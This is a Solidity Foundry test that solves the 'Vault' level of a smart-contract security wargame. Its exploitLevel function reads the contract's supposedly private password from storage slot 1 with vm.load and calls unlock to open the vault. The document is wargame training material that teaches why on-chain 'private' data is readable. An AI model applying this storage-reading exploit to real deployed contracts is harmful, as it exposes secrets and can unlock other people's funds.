// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Vault.sol";
import "../src/levels/VaultFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestVault is BaseTest{
    using SafeMath for uint256;
    Vault level;


    constructor() public{
        levelFactory = new VaultFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Vault(levelAddress);

        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        bytes32 password = vm.load(address(level),bytes32(uint256(1)));

        level.unlock(password);
        assertEq(level.locked(),false);

        vm.stopPrank();
    }
}